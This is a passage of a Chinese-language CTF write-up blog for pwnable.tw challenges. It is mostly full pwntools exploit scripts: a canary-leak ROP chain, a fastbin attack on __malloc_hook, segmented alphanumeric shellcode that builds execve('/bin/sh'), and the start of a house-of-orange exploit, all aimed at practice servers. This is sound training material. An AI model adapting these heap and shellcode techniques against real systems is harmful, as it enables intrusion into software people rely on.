class="string">b&#x27;A&#x27;</span>)+canary+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">copy(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破libc</span></span><br><span class="line">libcbase = get_libcbase(canary)-<span class="number">0x6ffb4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x21102</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;A&#x27;</span>)+canary+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7f</span>, <span class="number">0x67</span>, -<span class="number">1</span>):</span><br><span class="line">    buf = payload[:<span class="number">0x68</span>]+<span class="string">b&#x27;A&#x27;</span>*(i-<span class="number">0x68</span>)+p8(payload[i])</span><br><span class="line">    login(buf)</span><br><span class="line">    copy(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">login(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret()</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x10-CVE-2018-10387-—-wait-to-solve"><a href="#0x10-CVE-2018-10387-—-wait-to-solve" class="headerlink" title="0x10. CVE-2018-10387 — wait to solve"></a>0x10. CVE-2018-10387 — wait to solve</h2><h2 id="0x11-Bounty-Program-a-—-wait-to-solve"><a href="#0x11-Bounty-Program-a-—-wait-to-solve" class="headerlink" title="0x11. Bounty Program a — wait to solve"></a>0x11. Bounty Program a — wait to solve</h2><h2 id="0x12-secretgarden"><a href="#0x12-secretgarden" class="headerlink" title="0x12. secretgarden"></a>0x12. secretgarden</h2><p>保护全开，删除功能中存在UAF，<code>libc-2.23.so</code>，直接fastbin attack打__malloc_hook为one_gadget，同时用realloc调整栈帧</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10203</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./secretgarden&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">len_name, name, color</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of the name :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(len_name).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;The name of flower :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;The color of the flower :&#x27;</span>)</span><br><span class="line">    io.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Which flower do you want to remove from the garden:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_all</span>():</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)      <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)       <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xc0</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)       <span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Name of the flower[2] :&#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c3c41</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">__malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libcbase + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xef6c4</span>, <span class="number">0xf0567</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)       <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)       <span class="comment">#4</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x68</span>, p64(__malloc_hook-<span class="number">0x23</span>), <span class="string">b&#x27;A&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)       <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>)       <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(libcbase+one_gadget[<span class="number">2</span>])+p64(realloc+<span class="number">20</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x13-alive-note"><a href="#0x13-alive-note" class="headerlink" title="0x13. alive_note"></a>0x13. alive_note</h2><p>一道写分段shellcode的题，同时限制字符为大小写字母和数字。检查保护会发现只开了canary</p>
<p>做完这道题后上网看别的师傅的wp发现基本都是先调用read读取任意shellcode（也有尝试绕过字符限制的），然后execve的。但是我这里直接构造出了<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>（直接硬碰硬力，还好栈环境没干爆我心态</p>
<p>大致思路就是：</p>
<ul>
<li>先覆盖free_got，便于后面进入shellcode，同时free会携带堆地址作为参数</li>
<li>构造<code>/bin/sh</code>，并通过<code>popad</code>指令pop到ebx中</li>
<li>利用xor配合栈中地址构造出<code>INT 0x80</code>指令</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10300</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./alive_note&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, name</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">i</span>):</span><br><span class="line">    add(i, <span class="string">b&#x27;padpad00&#x27;</span>)</span><br><span class="line">    add(i, <span class="string">b&#x27;padpad00&#x27;</span>)</span><br><span class="line">    add(i, <span class="string">b&#x27;padpad00&#x27;</span>)</span><br><span class="line">    add(i, <span class="string">b&#x27;padpad00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode1 ===&gt; &#x27;</span>+shellcode1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x3830387a xor 0x38584b55 = 0x0068732f</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x38584b55</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode2 = asm(shellcode2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode2 ===&gt; &#x27;</span>+shellcode2)</span><br><span class="line"></span><br><span class="line">shellcode3 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax, 0x3830387a</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode3 = asm(shellcode3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode3 ===&gt; &#x27;</span>+shellcode3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x3838387a xor 0x56515a55 = 0x6e69622f</span></span><br><span class="line">shellcode4 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x3838387a</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode4 = asm(shellcode4)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode4 ===&gt; &#x27;</span>+shellcode4)</span><br><span class="line"></span><br><span class="line">shellcode5 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax, 0x56515a55</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode5 = asm(shellcode5)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode5 ===&gt; &#x27;</span>+shellcode5)</span><br><span class="line"></span><br><span class="line">shellcode6 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push esp</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    popad</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode6 = asm(shellcode6)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode6 ===&gt; &#x27;</span>+shellcode6)</span><br><span class="line"></span><br><span class="line">shellcode7 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    push 0x38</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode7 = asm(shellcode7)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode7 ===&gt; &#x27;</span>+shellcode7)</span><br><span class="line"></span><br><span class="line">shellcode8 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor al, 0x33</span></span><br><span class="line"><span class="string">    push edi</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode8 = asm(shellcode8)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode8 ===&gt; &#x27;</span>+shellcode8)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x43 xor 0x80 = 0xc3</span></span><br><span class="line">shellcode9 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor byte ptr [edi], dh</span></span><br><span class="line"><span class="string">    inc edi</span></span><br><span class="line"><span class="string">    xor byte ptr [edi], dh</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode9 = asm(shellcode9)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode9 ===&gt; &#x27;</span>+shellcode9)</span><br><span class="line"></span><br><span class="line">shellcode10 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    xor byte ptr [edi], dh</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode10 = asm(shellcode10)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;shellcode10 ===&gt; &#x27;</span>+shellcode10)</span><br><span class="line"></span><br><span class="line">shellcode11 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    jne $+0x4a</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode11 = asm(shellcode11)</span><br><span class="line"></span><br><span class="line">shellcode12 = <span class="string">b&#x27;\x41\x68&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -27为free_got</span></span><br><span class="line">add(-<span class="number">27</span>, shellcode1)</span><br><span class="line">pad(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, shellcode2)</span><br><span class="line">pad(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, shellcode3)</span><br><span class="line">pad(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, shellcode4)</span><br><span class="line">pad(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>, shellcode5)</span><br><span class="line">pad(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>, shellcode6)</span><br><span class="line">pad(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">5</span>, shellcode7)</span><br><span class="line">pad(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>, shellcode8)</span><br><span class="line">pad(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, shellcode9)</span><br><span class="line">pad(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>, shellcode10)</span><br><span class="line">pad(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>, shellcode11)</span><br><span class="line">pad(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>, shellcode12)</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x14-bookwriter"><a href="#0x14-bookwriter" class="headerlink" title="0x14. bookwriter"></a>0x14. bookwriter</h2><p><code>house of orange</code>例题(<code>unsorted bin attack + FSOP</code>)，不过不知道是什么玄学问题，导致本地永远不通（估计是环境导致的变量偏移</p>
<p>远程有一定几率通</p>
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10304</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./bookwriter&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_64.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io, <span class="string">&#x27;b *0x4009e9&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_author</span>(<span class="params">name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Author :&#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content :&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index of page :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index of page :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">choice, name=<span class="string">b&#x27;A&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Do you want to change the author ? (yes:1 / no:0) &#x27;</span>)</span><br><span class="line">    